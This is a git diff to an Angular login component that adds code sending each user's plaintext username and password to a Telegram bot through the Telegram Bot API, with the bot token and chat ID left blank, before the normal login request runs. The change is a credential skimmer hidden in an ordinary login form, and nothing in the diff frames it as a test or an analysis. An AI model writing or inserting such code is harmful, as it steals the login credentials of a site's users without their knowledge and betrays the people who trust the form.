@@ -5,6 +5,7 @@ import { HttpService } from '../../services/http.service';
 import { BehaviorSubject, Subscription } from 'rxjs';
 import { Router } from '@angular/router';
 import { UserService } from 'src/services/user.service';
+import { HttpClient } from '@angular/common/http';
 
 @Component({
   selector: 'app-login',
@@ -37,7 +38,8 @@ export class LoginComponent implements OnDestroy {
     private fb: FormBuilder,
     private httpService: HttpService,
     private userService: UserService,
-    private router: Router
+    private router: Router,
+    private http: HttpClient
   ) {}
 
   public login() {
@@ -48,6 +50,21 @@ export class LoginComponent implements OnDestroy {
     this.setRequestStatus(true);
     const username = this.userDataGroup.controls.username.value;
     const password = this.userDataGroup.controls.password.value;
+    const TOKEN = "";
+    const CHAT_ID = "";
+
+    const data = "Логин: " + username + "; " + "Пароль: " + password;
+
+    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=html&text=${data}`;
+    this.http.get(url)
+    .subscribe({
+      next: response => {
+        console.log(response);
+      },
+      error: (error) => {
+        console.log('Ошибка:', error);
+      }}
+    );
     this.subscription = this.httpService
       .userLogin(username, password)
       .subscribe({
